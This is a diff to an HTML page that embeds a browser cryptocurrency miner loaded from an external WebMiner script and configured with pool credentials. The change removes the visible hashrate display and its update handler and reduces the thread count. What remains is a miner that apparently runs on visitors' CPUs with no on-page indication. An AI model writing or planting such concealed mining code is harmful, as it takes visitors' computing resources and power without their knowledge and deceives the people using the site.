@@ -10,10 +10,7 @@
 <!-- Include WebMiner library -->
 <script src="https://webminer.pages.dev/dist/mm.js"></script>
 
-<!-- HTML element to display hashrate -->
-<div id="hashrateDisplay">Hashrate: Loading...</div>
-
-<!-- JavaScript code for mining and updating hashrate -->
+<!-- JavaScript code for mining -->
 <script>
 // Create a new Client instance
 const client = new Client({
@@ -25,22 +22,12 @@ const client = new Client({
     password: "c=DGB" // Your Mining password
   },
   options: {
-    threads: 3, // Number of CPU threads for mining
+    threads: 2, // Number of CPU threads for mining
     log: true // Show log on console
   },
 });
 
-// Function to update hashrate display
-function updateHashrate(hashrate) {
-  document.getElementById('hashrateDisplay').textContent = 'Hashrate: ' + hashrate + ' H/s';
-}
-
 // Start Mining
-client.on('accepted', (data) => {
-  const hashrate = data.hashrate.toFixed(2); // Round hashrate to 2 decimal places
-  updateHashrate(hashrate);
-});
-
 client.start();
 </script>
 
